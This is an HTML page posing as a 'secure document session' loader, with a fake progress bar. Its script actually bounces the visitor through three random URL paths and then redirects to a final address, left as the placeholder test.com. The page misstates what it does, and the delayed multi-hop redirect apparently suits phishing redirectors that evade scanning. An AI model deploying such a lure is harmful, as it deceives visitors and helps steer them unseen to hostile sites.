<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <title>Preparing Your Document</title>
    <style>
      :root {
        color-scheme: dark;
        font-family:
          Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
          sans-serif;
      }

      * {
        box-sizing: border-box;
      }

      body {
        align-items: center;
        background:
          radial-gradient(circle at 15% 15%, rgba(45, 212, 191, 0.13), transparent 26rem),
          radial-gradient(circle at 85% 80%, rgba(99, 102, 241, 0.15), transparent 30rem),
          #07111f;
        color: #f8fafc;
        display: flex;
        justify-content: center;
        margin: 0;
        min-height: 100vh;
        overflow: hidden;
        padding: 28px;
      }

      body::before {
        background-image:
          linear-gradient(rgba(148, 163, 184, 0.035) 1px, transparent 1px),
          linear-gradient(90deg, rgba(148, 163, 184, 0.035) 1px, transparent 1px);
        background-size: 38px 38px;
        content: "";
        inset: 0;
        pointer-events: none;
        position: fixed;
      }

      .loading-shell {
        max-width: 560px;
        position: relative;
        width: 100%;
      }

      .eyebrow {
        align-items: center;
        color: #5eead4;
        display: flex;
        font-size: 12px;
        font-weight: 700;
        gap: 9px;
        letter-spacing: 0.18em;
        margin: 0 0 18px;
        text-transform: uppercase;
      }

      .eyebrow::before {
        background: #2dd4bf;
        border-radius: 50%;
        box-shadow: 0 0 0 5px rgba(45, 212, 191, 0.12);
        content: "";
        height: 7px;
        width: 7px;
      }

      .loading-card {
        backdrop-filter: blur(18px);
        background: linear-gradient(145deg, rgba(20, 35, 55, 0.94), rgba(10, 22, 38, 0.94));
        border: 1px solid rgba(148, 163, 184, 0.16);
        border-radius: 28px;
        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.38);
        overflow: hidden;
        padding: 42px;
        position: relative;
      }

      .loading-card::after {
        background: #2dd4bf;
        border-radius: 50%;
        content: "";
        filter: blur(58px);
        height: 130px;
        opacity: 0.1;
        position: absolute;
        right: -55px;
        top: -55px;
        width: 130px;
      }

      .card-top {
        align-items: center;
        display: flex;
        gap: 22px;
      }

      .file-orbit {
        align-items: center;
        background: rgba(45, 212, 191, 0.08);
        border: 1px solid rgba(94, 234, 212, 0.2);
        border-radius: 50%;
        display: flex;
        flex: 0 0 auto;
        height: 88px;
        justify-content: center;
        position: relative;
        width: 88px;
      }

      .file-orbit::before {
        animation: orbit 1.8s linear infinite;
        border: 2px solid transparent;
        border-radius: inherit;
        border-top-color: #2dd4bf;
        content: "";
        inset: -1px;
        position: absolute;
      }

      .file-icon {
        height: 40px;
        position: relative;
        width: 32px;
      }

      .file-icon::before {
        background:
          linear-gradient(#2dd4bf, #2dd4bf) 7px 16px / 17px 2px no-repeat,
          linear-gradient(#64748b, #64748b) 7px 23px / 17px 2px no-repeat,
          linear-gradient(#64748b, #64748b) 7px 30px / 12px 2px no-repeat,
          #13243a;
        border: 1px solid #5eead4;
        border-radius: 4px;
        clip-path: polygon(0 0, 69% 0, 100% 24%, 100% 100%, 0 100%);
        content: "";
        inset: 0;
        position: absolute;
      }

      h1 {
        font-size: clamp(30px, 7vw, 46px);
        letter-spacing: -0.045em;
        line-height: 1;
        margin: 0;
      }

      .description {
        color: #94a3b8;
        font-size: 15px;
        line-height: 1.65;
        margin: 26px 0 0;
        max-width: 440px;
      }

      .progress-area {
        margin-top: 34px;
      }

      .progress-copy {
        align-items: center;
        color: #cbd5e1;
        display: flex;
        font-size: 12px;
        font-weight: 600;
        justify-content: space-between;
        letter-spacing: 0.04em;
        margin-bottom: 11px;
      }

      .progress {
        background: rgba(148, 163, 184, 0.14);
        border-radius: 999px;
        height: 6px;
        overflow: hidden;
      }

      .progress span {
        background: linear-gradient(90deg, #2dd4bf, #818cf8);
        border-radius: inherit;
        box-shadow: 0 0 18px rgba(45, 212, 191, 0.45);
        display: block;
        height: 100%;
        transition: width 0.1s linear;
        width: 0;
      }

      .steps {
        border-top: 1px solid rgba(148, 163, 184, 0.12);
        display: grid;
        gap: 16px;
        grid-template-columns: repeat(3, 1fr);
        margin-top: 34px;
        padding-top: 24px;
      }

      .step {
        color: #64748b;
        font-size: 11px;
        letter-spacing: 0.08em;
        text-transform: uppercase;
      }

      .step strong {
        color: #e2e8f0;
        display: block;
        font-size: 12px;
        letter-spacing: 0;
        margin-bottom: 5px;
        text-transform: none;
      }

      .step:first-child strong {
        color: #5eead4;
      }

      @keyframes orbit {
        to {
          transform: rotate(360deg);
        }
      }

      @media (max-width: 560px) {
        body {
          padding: 18px;
        }

        .loading-card {
          border-radius: 22px;
          padding: 30px 24px;
        }

        .card-top {
          align-items: flex-start;
          flex-direction: column;
        }

        .file-orbit {
          height: 74px;
          width: 74px;
        }

        .steps {
          gap: 12px;
        }
      }

      @media (prefers-reduced-motion: reduce) {
        *,
        *::before,
        *::after {
          animation-duration: 0.001ms !important;
          animation-iteration-count: 1 !important;
          scroll-behavior: auto !important;
          transition-duration: 0.001ms !important;
        }
      }
    </style>
  </head>
  <body>
    <main class="loading-shell" aria-live="polite">
      <p class="eyebrow">Secure document session</p>
      <section class="loading-card">
        <div class="card-top">
          <div class="file-orbit" aria-hidden="true">
            <div class="file-icon"></div>
          </div>
          <h1>Preparing your document</h1>
        </div>

        <p class="description">
          We are setting up a private viewing session. Keep this window open and you will be
          redirected automatically.
        </p>

        <div class="progress-area">
          <div class="progress-copy">
            <span>Loading session</span>
            <span>In progress</span>
          </div>
          <div class="progress" aria-hidden="true"><span id="loading-progress"></span></div>
        </div>

        <div class="steps" aria-hidden="true">
          <div class="step"><strong>01</strong>Connect</div>
          <div class="step"><strong>02</strong>Prepare</div>
          <div class="step"><strong>03</strong>Open</div>
        </div>
      </section>
    </main>

    <script>
      (function () {
        var finalUrl = "https://test.com";
        var initialLoadingDelayMs = 7000;
        var randomRedirectDelayMs = 2000;
        var maxRandomRedirects = 3;
        var minRandomPathLength = 10;
        var storageKey = "redirectStep";
        var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
        var tokenPattern = new RegExp("^/[A-Za-z0-9]{" + minRandomPathLength + ",}/?$");
        var currentPath = window.location.pathname.replace(/\/+$/, "");
        var progressBar = document.getElementById("loading-progress");
        var isInitialLoad = currentPath === "" || currentPath === "/index.html";
        var activeDelayMs = isInitialLoad ? initialLoadingDelayMs : randomRedirectDelayMs;
        var startedAt = Date.now();
        var requestFrame = window.requestAnimationFrame || function (callback) {
          return window.setTimeout(callback, 16);
        };

        function generateRandomPath() {
          var randomString = "";

          for (var index = 0; index < minRandomPathLength; index += 1) {
            randomString += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
          }

          return "/" + randomString;
        }

        function isInitialPath() {
          return isInitialLoad;
        }

        function redirectToNextStep() {
          var currentStep = Number(window.sessionStorage.getItem(storageKey) || "0");

          if (currentStep < maxRandomRedirects) {
            window.sessionStorage.setItem(storageKey, String(currentStep + 1));
            window.location.replace(generateRandomPath());
            return;
          }

          window.sessionStorage.removeItem(storageKey);
          window.location.replace(finalUrl);
        }

        function updateProgress() {
          var elapsedMs = Date.now() - startedAt;
          var progress = Math.min(elapsedMs / activeDelayMs, 1);

          progressBar.style.width = Math.round(progress * 100) + "%";

          if (progress < 1) {
            requestFrame(updateProgress);
          }
        }

        if (!isInitialPath()) {
          if (!tokenPattern.test(window.location.pathname)) {
            window.sessionStorage.setItem(storageKey, "0");
          }
        } else {
          window.sessionStorage.setItem(storageKey, "0");
        }

        updateProgress();
        window.setTimeout(function () {
          progressBar.style.width = "100%";
          redirectToNextStep();
        }, activeDelayMs);
      }());
    </script>
  </body>
</html>
